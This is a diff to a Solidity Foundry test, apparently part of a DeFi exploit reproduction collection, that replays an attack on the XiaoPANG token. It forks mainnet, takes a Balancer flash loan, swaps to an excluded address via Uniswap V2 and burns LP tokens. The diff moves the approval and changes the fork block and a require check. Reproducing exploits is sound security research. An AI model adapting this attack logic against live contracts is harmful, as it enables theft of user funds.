@@ -23,11 +23,10 @@ contract XiaoPANGExploit is BaseTestWithBalanceLog {
     address uniV2Pair = 0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745;
     address balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
-
-    address excludedTargetAddr = 0xb91060B06DCB9b8D16639C72E99DcaF44610079B;
-
     address vulnToken;
     address WETH;
+
+    address excludedTargetAddr = 0xb91060B06DCB9b8D16639C72E99DcaF44610079B;
 
     uint256 flashAmt = 1000 ether;
 
@@ -37,11 +36,12 @@ contract XiaoPANGExploit is BaseTestWithBalanceLog {
 
     function setUp() public {
         vm.createSelectFork(
-            "mainnet", vm.parseBytes32("0x8d616edf752e2ccc7f08a923892b0de723a717f0dde0aaba47c90448f778a532")
+            "mainnet", vm.parseBytes32("0x6cc9d3c00bf784442ca89388f42c1ed5e9284235e93f00ef6bd299760e559ccf")
         );
         vulnToken = pair.token0();
         fundingToken = pair.token1();
         WETH = fundingToken;
+        IERC20(WETH).approve(uniV2Router, flashAmt);
     }
 
     function testExploit() public balanceLog {
@@ -59,11 +59,10 @@ contract XiaoPANGExploit is BaseTestWithBalanceLog {
     }
 
     function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
-        IERC20(WETH).approve(uniV2Router, flashAmt);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             flashAmt, 0, getPath(), excludedTargetAddr, block.timestamp
         );
-        require(pair.balanceOf(uniV2Pair) > 2, "Not enough bal");
+        require(pair.balanceOf(uniV2Pair) > 0, "INSUFFICIENTLP");
         pair.burn(address(this));
         IERC20(WETH).transfer(msg.sender, flashAmt);
     }
